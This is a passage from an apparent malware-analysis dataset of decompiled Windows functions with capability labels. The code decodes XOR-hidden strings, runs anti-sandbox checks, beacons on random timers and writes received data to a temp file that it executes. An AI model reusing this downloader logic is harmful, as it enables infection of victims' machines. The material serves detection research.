var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_11ch = 0x200;\n    puVar3 = &pszFirst;\n    for (iVar2 = 0x400; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &lpBuffer;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &lpSystemInfo;\n    for (iVar2 = 0x24; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_5ch._0_1_ = 0xd;\n    var_5ch._1_1_ = 0x51;\n    var_5ch._2_1_ = 0x36;\n    var_5ch._3_1_ = 0x5a;\n    var_58h = 0x3f;\n    var_57h = 0;\n    var_56h = 0x55;\n    var_55h = 6;\n    var_54h = 0x6a;\n    var_53h = 0x50;\n    var_52h = 0x36;\n    var_51h = 0;\n    var_50h = 0x66;\n    var_28h._0_1_ = 0x66;\n    var_28h._1_1_ = 0x34;\n    var_28h._2_1_ = 0x44;\n    var_28h._3_1_ = 0x34;\n    var_24h = 0x5a;\n    var_23h = 0x6c;\n    fcn.004012a0(0xd);\n    for (var_4h = 0; var_4h < 0xd; var_4h = var_4h + 1) {\n        fcn.00401280(var_4h, *(&var_5ch + var_4h) ^ *(&var_28h + var_4h % 6));\n    }\n    var_70h._0_1_ = 0x3f;\n    var_70h._1_1_ = 0x36;\n    var_70h._2_1_ = 0x4c;\n    var_70h._3_1_ = 0x7b;\n    var_6ch = 0x29;\n    var_6bh = 0x4d;\n    var_6ah = 0x11;\n    var_69h = 0x25;\n    var_68h = 0x5d;\n    var_67h = 0x66;\n    var_66h = 0x31;\n    var_65h = 0x4a;\n    var_64h = 0xc;\n    var_63h = 0x36;\n    var_62h = 0x55;\n    var_61h = 0x7c;\n    var_60h = 0x26;\n    var_5fh = 0x5f;\n    var_5eh = 0x17;\n    var_5dh = 0x53;\n    var_30h._0_1_ = 0x78;\n    var_30h._1_1_ = 0x53;\n    var_30h._2_1_ = 0x38;\n    var_30h._3_1_ = 0x35;\n    var_2ch = 0x48;\n    var_2bh = 0x39;\n    fcn.004012a0(0x14);\n    for (var_8h = 0; var_8h < 0x14; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_70h + var_8h) ^ *(&var_30h + var_8h % 6));\n    }\n    uVar1 = fcn.00401270();\n    uVar1 = fcn.00401270(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(uVar1);\n    var_114h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    var_f8h._0_1_ = 6;\n    var_f8h._1_1_ = 0x65;\n    var_f8h._2_1_ = 0x11;\n    var_f8h._3_1_ = 0x78;\n    var_f4h = 0x3c;\n    var_f3h = 0x6b;\n    var_f2h = 0x2a;\n    var_f1h = 0x65;\n    var_f0h = 7;\n    var_efh = 0x78;\n    var_eeh = 0x2f;\n    var_edh = 0x6b;\n    var_ech = 0x3c;\n    var_ebh = 0x65;\n    var_eah = 0x15;\n    var_e9h = 0x78;\n    var_e8h = 0x12;\n    var_e7h = 0x6b;\n    var_e6h = 10;\n    var_e5h = 0x65;\n    var_e4h = 0x35;\n    var_e3h = 0x78;\n    var_e2h = 0x1d;\n    var_e1h = 0x6b;\n    var_e0h = 0xd;\n    var_dfh = 0x65;\n    var_deh = 0x22;\n    var_ddh = 0x78;\n    var_dch = 7;\n    var_dbh = 0x6b;\n    var_dah = 0x1e;\n    var_d9h = 0x65;\n    var_d8h = 0x24;\n    var_d7h = 0x78;\n    var_d6h = 7;\n    var_d5h = 0x6b;\n    var_d4h = 1;\n    var_d3h = 0x65;\n    var_d2h = 0x3e;\n    var_d1h = 0x78;\n    var_d0h = 0x12;\n    var_cfh = 0x6b;\n    var_ceh = 0x1d;\n    var_cdh = 0x65;\n    var_cch = 9;\n    var_cbh = 0x78;\n    var_cah = 0x3d;\n    var_c9h = 0x6b;\n    var_c8h = 0x3a;\n    var_c7h = 0x65;\n    var_c6h = 0x15;\n    var_c5h = 0x78;\n    var_c4h = 0x23;\n    var_c3h = 0x6b;\n    var_c2h = 0x12;\n    var_c1h = 0x65;\n    var_c0h = 0x33;\n    var_bfh = 0x78;\n    var_beh = 0x2b;\n    var_bdh = 0x6b;\n    var_bch = 0x20;\n    var_bbh = 0x65;\n    var_bah = 4;\n    var_b9h = 0x78;\n    var_b8h = 0x3c;\n    var_b7h = 0x6b;\n    var_b6h = 0x2f;\n    var_b5h = 0x65;\n    var_b4h = 0x1c;\n    var_b3h = 0x78;\n    var_b2h = 0x1e;\n    var_b1h = 0x6b;\n    var_b0h = 0x3c;\n    var_afh = 0x65;\n    var_aeh = 0x1f;\n    var_adh = 0x78;\n    var_ach = 0x2d;\n    var_abh = 0x6b;\n    var_aah = 0x2b;\n    var_a9h = 0x65;\n    var_a8h = 3;\n    var_a7h = 0x78;\n    var_a6h = 0x3d;\n    var_a5h = 0x6b;\n    var_a4h = 0x21;\n    var_a3h = 0x65;\n    var_a2h = 2;\n    var_a1h = 0x78;\n    var_a0h = 0x12;\n    var_9fh = 0x6b;\n    var_9eh = 0x7e;\n    var_9dh = 0x65;\n    var_9ch = 0x70;\n    var_9bh = 0x78;\n    var_38h._0_1_ = 0x4e;\n    var_38h._1_1_ = 0x65;\n    var_38h._2_1_ = 0x70;\n    var_38h._3_1_ = 0x78;\n    var_34h = 0x4e;\n    var_33h = 0x6b;\n    fcn.004012a0(0xbc);\n    for (var_ch = 0; var_ch < 0x5e; var_ch = var_ch + 1) {\n        fcn.00401280(var_ch, *(&var_f8h + var_ch) ^ *(&var_38h + var_ch % 6));\n    }\n    if (var_114h == NULL) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n    }\n    else {\n        (*var_114h)(&lpSystemInfo);\n    }\n    var_4ch._0_1_ = 0x2f;\n    var_4ch._1_1_ = 0x6c;\n    var_4ch._2_1_ = 0x2f;\n    var_4ch._3_1_ = 0x6c;\n    var_48h = 0x58;\n    var_47h = 0x77;\n    var_46h = 2;\n    var_45h = 0x4a;\n    var_44h = 0x6c;\n    var_43h = 0x37;\n    var_20h[0] = 0x77;\n    var_20h[1] = 0x6c;\n    var_20h[2] = 0x4a;\n    var_20h[3] = 0x6c;\n    var_1ch = 0x37;\n    fcn.004012a0(0x14);\n    for (var_10h = 0; var_10h < 10; var_10h = var_10h + 1) {\n        fcn.00401280(var_10h, *(&var_4ch + var_10h) ^ var_20h[var_10h % 5]);\n    }\n    uVar1 = fcn.00401270(&hKey);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)(reloc.WS2_32.dll_bind, uVar1);\n    if (iVar2 == 0) {\n        var_98h[0] = 0x20;\n        var_98h[1] = 0x74;\n        var_98h[2] = 2;\n        var_98h[3] = 0x4e;\n        var_94h = 0x56;\n        var_93h = 100;\n        var_92h = 0x13;\n        var_91h = 0x74;\n        var_90h = 0x15;\n        var_8fh = 0x4e;\n        var_8eh = 0x4a;\n        var_8dh = 100;\n        var_8ch = 3;\n        var_8bh = 0x74;\n        var_8ah = 0x1f;\n        var_89h = 0x4e;\n        var_88h = 0x4b;\n        var_87h = 100;\n        var_86h = 0x3e;\n        var_85h = 0x74;\n        var_84h = 0x11;\n        var_83h = 0x4e;\n        var_82h = 0x54;\n        var_81h = 100;\n        var_80h = 0x15;\n        var_7fh = 0x74;\n        var_7eh = 0x23;\n        var_7dh = 0x4e;\n        var_7ch = 0x4d;\n        var_7bh = 100;\n        var_7ah = 2;\n        var_79h = 0x74;\n        var_78h = 0x19;\n        var_77h = 0x4e;\n        var_76h = 0x57;\n        var_75h = 100;\n        var_74h = 0x17;\n        var_73h = 0x74;\n        var_72h = 0x70;\n        var_71h = 0x4e;\n        var_40h[0] = 0x70;\n        var_40h[1] = 0x74;\n        var_40h[2] = 0x70;\n        var_40h[3] = 0x4e;\n        var_3ch = 0x39;\n        var_3bh = 100;\n        fcn.004012a0(0x50);\n        for (var_14h = 0; var_14h < 0x28; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, var_98h[var_14h] ^ var_40h[var_14h % 6]);\n        }\n        uVar1 = fcn.00401270(0, 0, &pszFirst, &var_11ch);\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n        var_18h = &pszFirst;\n        var_120h = &pszFirst + 2;\n        do {\n            var_fah = *var_18h;\n            var_18h = var_18h + 2;\n        } while (var_fah != 0);\n        var_124h = var_18h - var_120h >> 1;\n        if (var_124h != 0) {\n            while( true ) {\n                uVar1 = fcn.00401270();\n                iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&pszFirst, uVar1);\n                if (iVar2 == 0) break;\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        fcn.004012d0();\n    }\n    while ((var_158h == 0 && (var_15ch < 2100000000))) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    fcn.004012d0();\n    return;\n}\n",
        "token_count": 4996
    },
    "00421ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00421ed0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, int16_t **arg_18h, int32_t *arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint var_60h;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uint8_t var_50h [4];\n    uchar var_4ch;\n    int32_t var_48h;\n    int16_t *var_44h;\n    int32_t uSize;\n    int16_t *var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t hFindFile;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    int16_t *var_24h;\n    int16_t *var_20h;\n    int32_t lpFileName;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int16_t *var_ch;\n    int32_t lpFindFileData;\n    int16_t var_4h;\n    uint var_2h;\n    \n    var_38h = 0;\n    var_28h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (lpFindFileData != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (lpFileName != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x210);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (var_ch != NULL) {\n                piVar3 = var_ch;\n                for (iVar2 = 0x210; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *piVar3 = 0;\n                    piVar3 = piVar3 + 1;\n                }\n                var_60h._0_1_ = 0x12;\n                var_60h._1_1_ = 0x43;\n                var_60h._2_1_ = 99;\n                var_60h._3_1_ = 0x33;\n                var_5ch = 0x68;\n                var_5bh = 0x4e;\n                var_5ah = 0x26;\n                var_59h = 0x49;\n                var_58h = 0x4b;\n                var_57h = 0x46;\n                var_56h = 0x2b;\n                var_55h = 0x43;\n                var_54h = 0x49;\n                var_53h = 0x33;\n                var_50h[0] = 0x4e;\n                var_50h[1] = 0x43;\n                var_50h[2] = 0x49;\n                var_50h[3] = 0x33;\n                var_4ch = 0x46;\n                fcn.004012a0(0x1c);\n                for (var_10h = 0; var_10h < 0xe; var_10h = var_10h + 1) {\n                    fcn.00401280(var_10h, *(&var_60h + var_10h) ^ var_50h[var_10h % 5]);\n                }\n                var_20h = fcn.00401270();\n                var_3ch = var_20h + 1;\n                do {\n                    var_2h._0_2_ = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (var_2h != 0);\n                uSize = var_20h - var_3ch >> 1;\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpFileName, 0x103 - uSize);\n                if (iVar2 != 0) {\n                    if (arg_8h == 0) {\n                        arg_ch = fcn.00411800(arg_14h);\n                        arg_ch = arg_ch & 0xff;\n                        arg_10h = fcn.00411800(arg_14h);\n                        arg_10h = arg_10h & 0xff;\n                    }\n                    uVar1 = fcn.00401270();\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, uVar1);\n                    hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, lpFindFileData);\n                    if (hFindFile != -1) {\n                        for (var_14h = 0; (var_14h <= arg_ch || (var_14h <= arg_10h)); var_14h = var_14h + 1) {\n                            if ((var_14h == arg_ch) || (var_14h == arg_10h)) {\n                                iVar2 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(lpFindFileData + 0x2c, 0, 0x2e);\n                                var_18h = (iVar2 - (lpFindFileData + 0x2c) >> 1) >> 1;\n                                var_2ch = 0;\n                                if ((var_28h != 0) && (var_2ch = var_18h - 4,  var_18h < var_2ch)) {\n                                    var_2ch = 0;\n                                }\n                                if (4 < var_18h) {\n                                    var_18h = 4;\n                                }\n                                var_24h = var_ch;\n                                var_44h = var_ch + 1;\n                                do {\n                                    var_4h = *var_24h;\n                                    var_24h = var_24h + 1;\n                                } while (var_4h != 0);\n                                var_48h = var_24h - var_44h >> 1;\n                                fcn.0041b3d0(var_ch + var_48h, lpFindFileData + 0x2c + var_2ch * 2, var_18h);\n                                var_28h = var_28h + var_18h;\n                            }\n                            iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, lpFindFileData);\n                            if (iVar2 == 0) {\n                                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, lpFindFileData);\n                            }\n                        }\n                        *arg_18h = var_ch;\n                        var_ch[var_28h] = 0;\n                        *arg_1ch = var_28h;\n                        var_38h = 1;\n                        (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                    }\n                }\n                if (var_38h == 0) {\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                fcn.004012d0();\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFindFileData);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return var_38h;\n}\n",
        "token_count": 1853
    },
    "00422460": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00422460(uint8_t *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint var_10h;\n    uint var_ch;\n    uint8_t *var_8h;\n    uint32_t var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = arg_10h;\n    while( true ) {\n        if (arg_ch == 0) break;\n        uVar1 = *var_8h;\n        var_8h = var_8h + 1;\n        var_4h = var_4h >> 8 ^ *((var_4h ^ uVar1) * 4 + 0x436108) ^ 0xd202ef8d;\n        arg_ch = arg_ch + -1;\n    }\n    return var_4h;\n}\n",
        "token_count": 213
    },
    "004224d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004224d0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_a8h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uchar var_40h;\n    uchar var_3fh;\n    uchar var_3eh;\n    uchar var_3dh;\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uchar var_24h;\n    uchar var_23h;\n    uchar var_22h;\n    uchar var_21h;\n    uint8_t var_20h [4];\n    uchar var_1ch;\n    uchar var_1bh;\n    uint8_t var_18h [4];\n    uchar var_14h;\n    int32_t psz2;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpPathName;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    psz2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    lpPathName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((psz2 != 0) && (lpPathName != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, lpPathName);\n        if ((iVar2 != 0) &&\n           ((iVar2 = (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(lpPathName, 0x4258fc, 0, psz2),  iVar2 != 0 &&\n            (iVar2 = fcn.00416790(psz2, arg_8h, arg_ch, 1),  iVar2 == 0)))) {\n            fcn.00416170(psz2);\n            puVar3 = &var_a8h;\n            for (iVar2 = 0x44; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_a8h = 0x44;\n            puVar3 = &var_64h;\n            for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_30h._0_1_ = 0x68;\n            var_30h._1_1_ = 0x74;\n            var_30h._2_1_ = 0x69;\n            var_30h._3_1_ = 0x67;\n            var_2ch = 0x4f;\n            var_2bh = 0x51;\n            var_2ah = 0x3e;\n            var_29h = 0x74;\n            var_28h = 0x2c;\n            var_27h = 0x67;\n            var_26h = 0x11;\n            var_25h = 0x51;\n            var_24h = 0x3e;\n            var_23h = 0x74;\n            var_22h = 0x49;\n            var_21h = 0x67;\n            var_20h[0] = 0x4a;\n            var_20h[1] = 0x74;\n            var_20h[2] = 0x49;\n            var_20h[3] = 0x67;\n            var_1ch = 0x62;\n            var_1bh = 0x51;\n            fcn.004012a0(0x20);\n            for (var_8h = 0; var_8h < 0x10; var_8h = var_8h + 1) {\n                fcn.00401280(var_8h, *(&var_30h + var_8h) ^ var_20h[var_8h % 6]);\n            }\n            var_4ch._0_1_ = 0x4f;\n            var_4ch._1_1_ = 0x45;\n            var_4ch._2_1_ = 0x42;\n            var_4ch._3_1_ = 0x37;\n            var_48h = 0x47;\n            var_47h = 0x6d;\n            var_46h = 0x68;\n            var_45h = 0x62;\n            var_44h = 0x45;\n            var_43h = 0x6a;\n            var_42h = 8;\n            var_41h = 0x45;\n            var_40h = 0xb;\n            var_3fh = 0x37;\n            var_3eh = 4;\n            var_3dh = 0x6d;\n            var_3ch = 0x36;\n            var_3bh = 0x62;\n            var_3ah = 0x43;\n            var_39h = 0x6a;\n            var_38h = 0xc;\n            var_37h = 0x45;\n            var_36h = 0xe;\n            var_35h = 0x37;\n            var_34h = 6;\n            var_33h = 0x6d;\n            var_32h = 0x45;\n            var_31h = 0x62;\n            var_18h[0] = 0x6d;\n            var_18h[1] = 0x45;\n            var_18h[2] = 0x62;\n            var_18h[3] = 0x37;\n            var_14h = 0x6a;\n            fcn.004012a0(0x38);\n            for (var_ch = 0; var_ch < 0x1c; var_ch = var_ch + 1) {\n                fcn.00401280(var_ch, *(&var_4ch + var_ch) ^ var_18h[var_ch % 5]);\n            }\n            (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpPathName, 0x425904);\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(lpPathName, psz2);\n            uVar1 = fcn.00401270();\n            (*_sym.imp.SHLWAPI.dll_StrCatW)(lpPathName, uVar1);\n            (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, lpPathName, 0, 0, 0, 0x9000008, 0, 0, &var_a8h, &var_64h);\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, psz2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpPathName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 1856
    },
    "004227c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004227c0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *0x436b98;\n    var_4h = arg_8h;\n    puVar3 = 0x436c00;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.00422ca0(arg_8h);\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x436b04 == 0) {\n        fcn.00422ca0(var_4h);\n        var_14h = 0;\n        var_10h = 0;\n        iVar2 = fcn.00422880(&var_14h, *0x436ae0);\n        if (iVar2 != 0) {\n            if (0x800 < var_14h) {\n                fcn.004224d0(var_10h, var_14h);\n            }\n            fcn.004245f0(&var_14h);\n        }\n        uVar1 = fcn.00401850(&var_8h);\n        var_ch = uVar1 % 600000 + 60000;\n        (*_sym.imp.KERNEL32.dll_Sleep)(var_ch);\n    }\n    return 0;\n}\n",
        "token_count": 372
    },
    "00422880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWSAData\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00422880(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpWSAData;\n    uint ARG_0;\n    uint32_t var_8ch;\n    int32_t dwMilliseconds;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    uint32_t var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uchar var_50h;\n    uchar var_4fh;\n    uchar var_4eh;\n    uchar var_4dh;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uchar var_42h;\n    uchar var_41h;\n    uint8_t var_40h [4];\n    uchar var_3ch;\n    uchar var_3bh;\n    uchar var_3ah;\n    uchar var_39h;\n    uchar var_38h;\n    uchar var_37h;\n    uchar var_36h;\n    uchar var_35h;\n    uchar var_34h;\n    uchar var_33h;\n    uint var_30h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uint8_t var_28h [4];\n    uchar var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    uint32_t var_18h;\n    char *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_84h = *0x436b98;\n    var_68h._0_1_ = 0x56;\n    var_68h._1_1_ = 10;\n    var_68h._2_1_ = 0x52;\n    var_68h._3_1_ = 0x26;\n    var_64h = 0x27;\n    var_63h = 0x3e;\n    var_62h = 0x50;\n    var_61h = 0;\n    var_60h = 0x58;\n    var_5fh = 0x28;\n    var_5eh = 0x29;\n    var_5dh = 0x34;\n    var_5ch = 0x5a;\n    var_5bh = 6;\n    var_5ah = 0x5e;\n    var_59h = 0x32;\n    var_58h = 0x33;\n    var_57h = 0x2a;\n    var_56h = 0x44;\n    var_55h = 0x1c;\n    var_54h = 0x44;\n    var_53h = 0x34;\n    var_52h = 0x35;\n    var_51h = 0x20;\n    var_50h = 0x4e;\n    var_4fh = 0x12;\n    var_4eh = 0x1f;\n    var_4dh = 0x6f;\n    var_4ch = 0x1d;\n    var_4bh = 0x69;\n    var_4ah = 5;\n    var_49h = 0x5b;\n    var_48h = 5;\n    var_47h = 0x77;\n    var_46h = 0x74;\n    var_45h = 0x6f;\n    var_44h = 0xf;\n    var_43h = 0x51;\n    var_42h = 1;\n    var_41h = 0x42;\n    var_30h._0_1_ = 0x37;\n    var_30h._1_1_ = 0x68;\n    var_30h._2_1_ = 0x31;\n    var_30h._3_1_ = 0x42;\n    var_2ch = 0x42;\n    var_2bh = 0x58;\n    fcn.004012a0(0x28);\n    for (var_8h = 0; var_8h < 0x28; var_8h = var_8h + 1) {\n        fcn.00401280(var_8h, *(&var_68h + var_8h) ^ *(&var_30h + var_8h % 6));\n    }\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_ch = 0;\n    do {\n        if (9 < var_ch) {\ncode_r0x00422c5a:\n            var_78h = *arg_8h != 0;\n            var_8ch = var_78h;\n            fcn.004012d0();\n            return var_8ch;\n        }\n        var_14h = var_ch * 0x20 + 0x436508;\n        var_7ch = 0;\n        var_18h = 0;\n        var_74h = 1;\n        for (var_6ch = 0; var_6ch < 0x20; var_6ch = var_6ch + 1) {\n            if (var_14h[var_ch] != '\\0') {\n                iVar3 = var_14h[var_ch];\n                uVar1 = fcn.00401270();\n                iVar3 = fcn.0041b2e0(uVar1, iVar3);\n                if (iVar3 == 0) {\n                    var_74h = 0;\n                    break;\n                }\n            }\n        }\n        if (((*var_14h != '\\0') && (var_14h[0x1f] == '\\0')) && (var_74h != 0)) {\n            puVar4 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            puVar4 = &var_20h;\n            for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            var_40h[0] = 0x5c;\n            var_40h[1] = 8;\n            var_40h[2] = 0x35;\n            var_40h[3] = 0x34;\n            var_3ch = 0x11;\n            var_3bh = 0;\n            var_3ah = 0x13;\n            var_39h = 0x36;\n            var_38h = 0x25;\n            var_37h = 0x57;\n            var_36h = 0x5c;\n            var_35h = 0x5f;\n            var_34h = 0x21;\n            var_33h = 0x51;\n            var_28h[0] = 0x73;\n            var_28h[1] = 0x7a;\n            var_28h[2] = 0x45;\n            var_28h[3] = 0x51;\n            var_24h = 99;\n            fcn.004012a0(0xe);\n            for (var_10h = 0; var_10h < 0xe; var_10h = var_10h + 1) {\n                fcn.00401280(var_10h, var_40h[var_10h] ^ var_28h[var_10h % 5]);\n            }\n            uVar1 = fcn.00401270(arg_ch);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, uVar1);\n            lpWSAData = 0;\n            var_80h = fcn.00410bc0(var_14h, &var_20h, 0, &ARG_0, &var_18h, &var_7ch, 0x1bb);\n            if (var_80h == 0) {\n                if (var_18h == 0) {\n                    fcn.004245f0(&var_20h);\n                    fcn.004012d0();\n                    goto code_r0x00422c5a;\n                }\n                if (var_20h < var_18h) {\n                    